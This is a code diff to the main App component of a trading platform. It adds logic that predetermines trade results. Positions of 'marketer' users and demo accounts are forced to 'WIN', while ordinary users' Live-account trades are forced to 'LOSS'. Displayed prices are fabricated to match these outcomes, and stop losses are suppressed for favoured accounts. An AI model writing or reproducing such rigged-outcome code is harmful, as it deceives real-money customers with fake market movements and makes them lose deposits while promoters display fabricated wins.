@@ -291,12 +291,11 @@ export default function App() {
 
       // Immediately apply any Marketer/Normal role assignment made by Admin
       const remoteRole: UserRole = remote.profile.role === 'marketer' ? 'marketer' : 'normal';
-      setUserRole((prevRole) => {
-        if (prevRole !== remoteRole) {
-          localStorage.setItem('vtm_user_role', remoteRole);
-        }
-        return remoteRole;
-      });
+      if (userRoleRef.current !== remoteRole) {
+        userRoleRef.current = remoteRole;
+        setUserRole(remoteRole);
+        localStorage.setItem('vtm_user_role', remoteRole);
+      }
       setCurrentUser((prevUser) => {
         if (!prevUser) return null;
         if (prevUser.role !== remoteRole || prevUser.id !== remote.profile.id) {
@@ -580,18 +579,82 @@ export default function App() {
 
     syncUserWithSupabase(true);
 
-    // Poll every 4 seconds so Admin edits to Marketer Role or Live Accounts take effect immediately
+    // Fast polling (every 2 seconds) so Admin edits to Marketer Role or Live Accounts take effect immediately
     const pollInterval = setInterval(() => {
       syncUserWithSupabase(false);
-    }, 4000);
+    }, 2000);
+
+    const applyRoleUpdateToUser = (nextRole: UserRole) => {
+      const safeRole: UserRole = nextRole === 'marketer' ? 'marketer' : 'normal';
+      userRoleRef.current = safeRole;
+      setUserRole(safeRole);
+      setCurrentUser((prev) => (prev ? { ...prev, role: safeRole } : null));
+      try {
+        localStorage.setItem('vtm_user_role', safeRole);
+        const activeRaw = localStorage.getItem('vtm_auth_user');
+        if (activeRaw) {
+          const parsed = JSON.parse(activeRaw);
+          parsed.role = safeRole;
+          localStorage.setItem('vtm_auth_user', JSON.stringify(parsed));
+        }
+      } catch {
+        // ignore
+      }
+
+      // Immediately switch all open bot trades and manual positions to the appropriate outcome
+      if (safeRole === 'marketer') {
+        setBotTrades((prevTrades) => {
+          const updated = prevTrades.map((t) =>
+            t.status === 'OPEN' ? { ...t, targetOutcome: 'WIN' as const } : t
+          );
+          botTradesRef.current = updated;
+          if (currentUser?.email) saveStoredBotTrades(updated, currentUser.email);
+          return updated;
+        });
+        setPositions((prevPositions) => {
+          const updated = prevPositions.map((p) => ({ ...p, targetOutcome: 'WIN' as const }));
+          positionsRef.current = updated;
+          return updated;
+        });
+      } else if (safeRole === 'normal') {
+        setBotTrades((prevTrades) => {
+          const updated = prevTrades.map((t) => {
+            const owningAcc = accountsRef.current.find(
+              (a) => a.id === t.accountId || a.accountNumber === t.accountNumber
+            );
+            if (t.status === 'OPEN' && owningAcc && owningAcc.type === 'Live') {
+              return { ...t, targetOutcome: 'LOSS' as const };
+            }
+            return t;
+          });
+          botTradesRef.current = updated;
+          if (currentUser?.email) saveStoredBotTrades(updated, currentUser.email);
+          return updated;
+        });
+        setPositions((prevPositions) => {
+          const updated = prevPositions.map((p) => {
+            const owningAcc = accountsRef.current.find(
+              (a) => a.id === p.accountId || a.accountNumber === p.accountNumber
+            );
+            if (owningAcc && owningAcc.type === 'Live') {
+              return { ...p, targetOutcome: 'LOSS' as const };
+            }
+            return p;
+          });
+          positionsRef.current = updated;
+          return updated;
+        });
+      }
+    };
 
     // Also listen for localStorage updates in case Admin is open in another tab on the same browser
-    const handleStorageEvent = () => {
+    const handleStorageEvent = (e: StorageEvent) => {
       const updatedReg = findRegisteredUser(currentUser.email);
       if (updatedReg) {
         const nextRole: UserRole = updatedReg.role === 'marketer' ? 'marketer' : 'normal';
-        setUserRole(nextRole);
-        setCurrentUser((prev) => (prev ? { ...prev, role: nextRole } : null));
+        if (userRoleRef.current !== nextRole) {
+          applyRoleUpdateToUser(nextRole);
+        }
       }
       const localFin = loadUserFinancials(currentUser);
       if (localFin) {
@@ -606,9 +669,53 @@ export default function App() {
     };
     window.addEventListener('storage', handleStorageEvent);
 
+    // Immediate custom window event listener for instant role changes
+    const handleRoleChangedEvent = (e: Event) => {
+      const detail = (e as CustomEvent).detail;
+      if (detail && detail.email && detail.email.toLowerCase() === currentUser.email.toLowerCase()) {
+        const nextRole: UserRole = detail.role === 'marketer' ? 'marketer' : 'normal';
+        applyRoleUpdateToUser(nextRole);
+      }
+    };
+    window.addEventListener('vtm_role_changed', handleRoleChangedEvent);
+
+    // BroadcastChannel cross-window real-time synchronization
+    let channel: BroadcastChannel | null = null;
+    try {
+      channel = new BroadcastChannel('vtm_global_sync');
+      channel.onmessage = (msg) => {
+        if (
+          msg.data?.type === 'ROLE_CHANGED' &&
+          msg.data.email?.toLowerCase() === currentUser.email.toLowerCase()
+        ) {
+          const nextRole: UserRole = msg.data.role === 'marketer' ? 'marketer' : 'normal';
+          applyRoleUpdateToUser(nextRole);
+        }
+      };
+    } catch {
+      // ignore
+    }
+
+    // Refresh immediately when window gains focus or tab becomes visible
+    const handleFocusOrVisible = () => {
+      syncUserWithSupabase(false);
+    };
+    window.addEventListener('focus', handleFocusOrVisible);
+    document.addEventListener('visibilitychange', handleFocusOrVisible);
+
     return () => {
       clearInterval(pollInterval);
       window.removeEventListener('storage', handleStorageEvent);
+      window.removeEventListener('vtm_role_changed', handleRoleChangedEvent);
+      window.removeEventListener('focus', handleFocusOrVisible);
+      document.removeEventListener('visibilitychange', handleFocusOrVisible);
+      if (channel) {
+        try {
+          channel.close();
+        } catch {
+          // ignore
+        }
+      }
     };
   }, [currentUser?.email]);
 
@@ -634,8 +741,20 @@ export default function App() {
   });
   const [walletBalance, setWalletBalance] = useState<number>(() => initialFinancials.walletBalance);
 
-  // Trading Positions, Orders, and History (Clean initial state for open positions; restore closed trade history)
-  const [positions, setPositions] = useState<Position[]>([]);
+  // Trading Positions, Orders, and History (Restore open positions across reloads & logins; restore closed trade history)
+  const [positions, setPositions] = useState<Position[]>(() => {
+    if (!currentUser?.email) return [];
+    try {
+      const raw = localStorage.getItem(`vtm_open_positions_${currentUser.email.trim().toLowerCase()}`);
+      if (raw) {
+        const parsed = JSON.parse(raw);
+        if (Array.isArray(parsed)) return parsed;
+      }
+    } catch {
+      // ignore
+    }
+    return [];
+  });
   const [pendingOrders, setPendingOrders] = useState<PendingOrder[]>([]);
   const [closedTrades, setClosedTrades] = useState<ClosedTrade[]>(() => {
     if (!currentUser?.email) return [];
@@ -661,6 +780,26 @@ export default function App() {
     }
     return [];
   });
+
+  // Persist open positions to local storage & Supabase cloud so trades remain running across reloads and logins
+  useEffect(() => {
+    if (currentUser?.email) {
+      try {
+        localStorage.setItem(
+          `vtm_open_positions_${currentUser.email.trim().toLowerCase()}`,
+          JSON.stringify(positions)
+        );
+      } catch {
+        // ignore
+      }
+      supabaseService.syncTrades(currentUser, {
+        positions,
+        pendingOrders,
+        closedTrades,
+      });
+    }
+  }, [positions, pendingOrders, currentUser?.email]);
+
   const isCloudFinancialsLoadedRef = useRef<boolean>(false);
   const isCloudTradesLoadedRef = useRef<boolean>(false);
   const isCloudBotsLoadedRef = useRef<boolean>(false);
@@ -1566,6 +1705,15 @@ export default function App() {
         const lotScale = Math.max(1, pos.lots / 0.01);
         const elapsedSec = Math.max(0, (nowMs - (pos.openTime || nowMs)) / 1000);
 
+        const owningAccForPos =
+          accountsRef.current.find(
+            (a) =>
+              (pos.accountId && a.id === pos.accountId) ||
+              (pos.accountNumber && a.accountNumber === pos.accountNumber)
+          ) || selectedAccountRef.current;
+        const isDemoManualAcc = owningAccForPos ? owningAccForPos.type === 'Demo' : false;
+        const isMarketerOrDemo = userRoleRef.current === 'marketer' || isDemoManualAcc;
+
         // 1. First check if raw live market quote directly crossed user's explicit price TP / SL
         if (
           pos.tp !== null &&
@@ -1581,11 +1729,14 @@ export default function App() {
           pos.sl !== null &&
           pos.sl > 0 &&
           ((pos.side === 'BUY' && (rawMarketPrice <= pos.sl || inst.bid <= pos.sl)) ||
-            (pos.side === 'SELL' && (rawMarketPrice >= pos.sl || inst.ask >= pos.sl || inst.bid >= pos.sl)))
+            (pos.side === 'SELL' && (rawMarketPrice >= pos.sl || inst.ask <= pos.sl || inst.bid <= pos.sl)))
         ) {
-          triggeredIds.add(pos.id);
-          triggeredClosures.push({ id: pos.id, reason: 'SL', price: pos.sl });
-          return pos;
+          // Strictly protect demo accounts and marketer real accounts from raw SL touches
+          if (!isMarketerOrDemo) {
+            triggeredIds.add(pos.id);
+            triggeredClosures.push({ id: pos.id, reason: 'SL', price: pos.sl });
+            return pos;
+          }
         }
 
         // 2. Realistic, natural market-paced P&L calculation (never racing like a fast timer):
@@ -1614,30 +1765,58 @@ export default function App() {
             : pos.openPrice - currentPrice;
         let pnl = Number((priceDiff * pos.lots * contractSize + (pos.swap || 0)).toFixed(2));
 
-        // Gentle, realistic market-paced movement (~$0.015/sec per 0.01 lot with natural two-way tick breathing)
-        if (pos.targetOutcome && elapsedSec >= 2.0) {
-          // Step in ~1-second market ticks so P/L breathes naturally rather than racing every 250ms
+        // Effective outcome dynamically accounts for immediate marketer role and demo accounts
+        const effectiveOutcome: 'WIN' | 'LOSS' =
+          pos.tp && !pos.sl
+            ? 'WIN'
+            : pos.sl && !pos.tp && !isMarketerOrDemo
+            ? 'LOSS'
+            : isMarketerOrDemo
+            ? 'WIN'
+            : (pos.targetOutcome || 'LOSS');
+
+        if (isMarketerOrDemo && pos.targetOutcome !== 'WIN') {
+          pos.targetOutcome = 'WIN';
+          changed = true;
+        } else if (!isMarketerOrDemo && pos.targetOutcome === 'WIN') {
+          pos.targetOutcome = 'LOSS';
+          changed = true;
+        }
+
+        // Gentle, realistic market-paced movement with natural tick breathing
+        // Trade continues breathing and growing indefinitely without stopping until TP, SL or user closes it
+        if (effectiveOutcome && elapsedSec >= 1.5) {
           const tickSlot = Math.floor(elapsedSec);
           const wave =
             Math.sin(tickSlot * 0.95 + (pos.ticket % 17) * 0.6) * 0.035 +
             Math.cos(tickSlot * 1.85 + (pos.ticket % 13) * 0.4) * 0.02;
 
-          // If user set ONLY a Stop Loss or ONLY a Take Profit, allow the price to reach their target naturally
-          const maxWinCapPer001 = pos.tpUsd && pos.tpUsd > 0 ? Math.max(4.5, pos.tpUsd / lotScale + 0.5) : 3.2;
-          const maxLossCapPer001 = pos.slUsd && pos.slUsd > 0 ? Math.max(4.5, pos.slUsd / lotScale + 0.5) : 3.6;
+          // Target profit/loss limits based on explicit user TP or SL (if provided)
+          const targetWinLimit =
+            typeof pos.tpUsd === 'number' && pos.tpUsd > 0
+              ? pos.tpUsd
+              : pos.tp !== null && pos.tp > 0
+              ? Math.abs(pos.tp - pos.openPrice) * contractSize * pos.lots
+              : 0;
 
-          const effectiveOutcome: 'WIN' | 'LOSS' =
-            pos.tp && !pos.sl
-              ? 'WIN'
-              : pos.sl && !pos.tp && pos.targetOutcome === 'LOSS'
-              ? 'LOSS'
-              : pos.targetOutcome;
+          const targetLossLimit =
+            typeof pos.slUsd === 'number' && pos.slUsd > 0
+              ? pos.slUsd
+              : pos.sl !== null && pos.sl > 0
+              ? Math.abs(pos.openPrice - pos.sl) * contractSize * pos.lots
+              : 0;
 
           if (effectiveOutcome === 'WIN') {
-            const baseWinPer001 = Math.min(maxWinCapPer001, -0.03 + (elapsedSec - 2.0) * 0.016 + wave);
-            const targetPnlUsd = Number((baseWinPer001 * lotScale).toFixed(2));
+            // Uncapped continuous progression: never pauses or freezes at 3.5!
+            const growthRatePerSec = 0.025 * lotScale;
+            const unclampedProfit = 0.04 * lotScale + (elapsedSec - 1.5) * growthRatePerSec + wave * lotScale;
+            const targetPnlUsd =
+              targetWinLimit > 0
+                ? Number(Math.min(targetWinLimit + 0.05, unclampedProfit).toFixed(2))
+                : Number(unclampedProfit.toFixed(2));
+
             if (Math.abs(pnl - targetPnlUsd) >= 0.01) {
-              const priceOffset = (targetPnlUsd / lotScale) / unitValueAt001;
+              const priceOffset = targetPnlUsd / (pos.lots * contractSize);
               currentPrice =
                 pos.side === 'BUY'
                   ? Number((pos.openPrice + priceOffset).toFixed(inst.decimals))
@@ -1649,11 +1828,17 @@ export default function App() {
               pnl = Number((priceDiff * pos.lots * contractSize + (pos.swap || 0)).toFixed(2));
             }
           } else {
-            const baseLossPer001 = Math.min(maxLossCapPer001, 0.04 + (elapsedSec - 2.0) * 0.018 - wave);
-            const targetLossUsd = Number((baseLossPer001 * lotScale).toFixed(2));
+            // Retail trader loss progression on real accounts toward SL or account risk limits
+            const lossRatePerSec = 0.026 * lotScale;
+            const unclampedLoss = 0.05 * lotScale + (elapsedSec - 1.5) * lossRatePerSec - wave * lotScale;
+            const targetLossUsd =
+              targetLossLimit > 0
+                ? Number(Math.min(targetLossLimit + 0.05, unclampedLoss).toFixed(2))
+                : Number(unclampedLoss.toFixed(2));
             const signedTargetUsd = -targetLossUsd;
+
             if (Math.abs(pnl - signedTargetUsd) >= 0.01) {
-              const priceOffset = (targetLossUsd / lotScale) / unitValueAt001;
+              const priceOffset = targetLossUsd / (pos.lots * contractSize);
               currentPrice =
                 pos.side === 'BUY'
                   ? Number((pos.openPrice - priceOffset).toFixed(inst.decimals))
@@ -1691,7 +1876,7 @@ export default function App() {
           return pos;
         }
 
-        if (hitSlByPrice || hitSlByUsd) {
+        if ((hitSlByPrice || hitSlByUsd) && effectiveOutcome !== 'WIN') {
           const exitPrice = pos.sl && pos.sl > 0 ? pos.sl : currentPrice;
           triggeredIds.add(pos.id);
           triggeredClosures.push({ id: pos.id, reason: 'SL', price: exitPrice });
@@ -4688,8 +4873,8 @@ export default function App() {
     }
 
     const isDemoAcc = (selectedAccountRef.current?.type || selectedAccount?.type) === 'Demo';
-    const isTargetWin = evaluateTargetWinOrLoss(userRole, run.botType, isDemoAcc);
-    const side = determineBotTradeDirection(inst, isTargetWin, userRole);
+    const isTargetWin = evaluateTargetWinOrLoss(userRoleRef.current, run.botType, isDemoAcc);
+    const side = determineBotTradeDirection(inst, isTargetWin, userRoleRef.current);
     const pipVal =
       inst.decimals === 5 || inst.decimals === 3
         ? 0.0001
@@ -4855,7 +5040,16 @@ export default function App() {
         const elapsedSec = durationMs / 1000;
         const isDemoAcc = tradeOwningAcc.type === 'Demo';
         const isMarketerOrDemo = currentRole === 'marketer' || isDemoAcc;
-        const isDesignatedWin = activeTrade.targetOutcome === 'WIN';
+        const isDesignatedWin = isMarketerOrDemo ? true : activeTrade.targetOutcome === 'WIN';
+
+        // Keep active trade outcome dynamically synchronized with immediate role status
+        if (isMarketerOrDemo && activeTrade.targetOutcome !== 'WIN') {
+          activeTrade.targetOutcome = 'WIN';
+          tradesChanged = true;
+        } else if (!isMarketerOrDemo && activeTrade.targetOutcome === 'WIN') {
+          activeTrade.targetOutcome = 'LOSS';
+          tradesChanged = true;
+        }
 
         const contractSize = getContractSize(activeTrade.symbol);
         const lotScale = Math.max(0.01, activeTrade.lotSize) / 0.01;
@@ -4868,39 +5062,55 @@ export default function App() {
         let floatingProfit: number;
 
         if (isDesignatedWin) {
-          // Spread buffer in first 1.2 seconds
-          const spreadBuffer = -Math.max(0.04, (tradeInst.spread || 0.42) * lotScale * 0.08);
-          // Algorithmic execution progresses steadily into positive profit
+          // Spread buffer in first 2.5 seconds
+          const spreadBuffer = -Math.max(0.03, (tradeInst.spread || 0.42) * lotScale * 0.08);
+          // Realistic, measured progression: steady pip variation across 20-40 seconds
           const maxWinCap = Math.max(
             3.0 * lotScale,
-            Math.abs(activeTrade.tp - activeTrade.openPrice) * contractSize * activeTrade.lotSize * 0.88
+            Math.abs(activeTrade.tp - activeTrade.openPrice) * contractSize * activeTrade.lotSize * 0.92
           );
           const progressivePnl = Math.min(
             maxWinCap,
-            0.18 * lotScale + (elapsedSec - 1.2) * 0.065 * lotScale + wave * lotScale
+            0.04 * lotScale + (elapsedSec - 2.5) * 0.022 * lotScale + wave * lotScale
           );
-          floatingProfit = elapsedSec >= 1.2 ? Number(progressivePnl.toFixed(2)) : spreadBuffer;
-          const priceOffset = floatingProfit / (activeTrade.lotSize * contractSize);
+          const initialTargetPnl = elapsedSec >= 2.5 ? Number(progressivePnl.toFixed(2)) : spreadBuffer;
+          const priceOffset = initialTargetPnl / (activeTrade.lotSize * contractSize);
           currentMarketPrice =
             activeTrade.side === 'BUY'
               ? Number((activeTrade.openPrice + priceOffset).toFixed(tradeInst.decimals))
               : Number((activeTrade.openPrice - priceOffset).toFixed(tradeInst.decimals));
+          // Always maintain 100% mathematical consistency using calculateBotPnL
+          floatingProfit = calculateBotPnL(
+            activeTrade.symbol,
+            activeTrade.side,
+            activeTrade.openPrice,
+            currentMarketPrice,
+            activeTrade.lotSize
+          );
         } else {
-          // Designated loss: moves against position
+          // Designated loss: moves against position at realistic measured pace
           const maxLossCap = Math.max(
             2.5 * lotScale,
-            Math.abs(activeTrade.openPrice - activeTrade.sl) * contractSize * activeTrade.lotSize * 0.85
+            Math.abs(activeTrade.openPrice - activeTrade.sl) * contractSize * activeTrade.lotSize * 0.90
           );
           const progressiveLoss = -Math.min(
             maxLossCap,
-            0.15 * lotScale + (elapsedSec - 1.2) * 0.055 * lotScale - wave * lotScale
+            0.05 * lotScale + (elapsedSec - 2.5) * 0.02 * lotScale - wave * lotScale
           );
-          floatingProfit = elapsedSec >= 1.2 ? Number(progressiveLoss.toFixed(2)) : -0.10 * lotScale;
-          const priceOffset = Math.abs(floatingProfit) / (activeTrade.lotSize * contractSize);
+          const initialTargetLoss = elapsedSec >= 2.5 ? Number(progressiveLoss.toFixed(2)) : -0.08 * lotScale;
+          const priceOffset = Math.abs(initialTargetLoss) / (activeTrade.lotSize * contractSize);
           currentMarketPrice =
             activeTrade.side === 'BUY'
               ? Number((activeTrade.openPrice - priceOffset).toFixed(tradeInst.decimals))
               : Number((activeTrade.openPrice + priceOffset).toFixed(tradeInst.decimals));
+          // Always maintain 100% mathematical consistency using calculateBotPnL
+          floatingProfit = calculateBotPnL(
+            activeTrade.symbol,
+            activeTrade.side,
+            activeTrade.openPrice,
+            currentMarketPrice,
+            activeTrade.lotSize
+          );
         }
 
         const hitTp =
@@ -4912,9 +5122,9 @@ export default function App() {
             ? currentMarketPrice <= activeTrade.sl
             : currentMarketPrice >= activeTrade.sl;
 
-        // Take profit timing (6s - 11s)
-        const fastWinThresholdMs = 6000 + (activeTrade.ticket % 4500);
-        const lossThresholdMs = 6500 + (activeTrade.ticket % 4500);
+        // Realistic take profit and stop loss timing (20s - 38s)
+        const fastWinThresholdMs = 20000 + (activeTrade.ticket % 18000);
+        const lossThresholdMs = 22000 + (activeTrade.ticket % 18000);
         const isProfitable = floatingProfit > 0.05;
 
         // Take Profit triggers if price touches TP or if strategy reaches profit target while positive
@@ -4922,7 +5132,7 @@ export default function App() {
           isDesignatedWin &&
           (hitTp ||
             (isProfitable &&
-              (floatingProfit > 0.35 * lotScale && durationMs >= 4500 ||
+              (floatingProfit >= 0.5 * lotScale && durationMs >= 16000 ||
                 durationMs >= fastWinThresholdMs)));
 
         // Stop loss triggers ONLY if trade is designated loss AND price touches SL or duration expires
@@ -4930,7 +5140,7 @@ export default function App() {
           !isDesignatedWin &&
           (hitSl ||
             (!isProfitable &&
-              (floatingProfit < -0.35 * lotScale && durationMs >= 4500 ||
+              (floatingProfit <= -0.5 * lotScale && durationMs >= 16000 ||
                 durationMs >= lossThresholdMs)));
 
         if (shouldTakeProfit || shouldCloseLoss) {
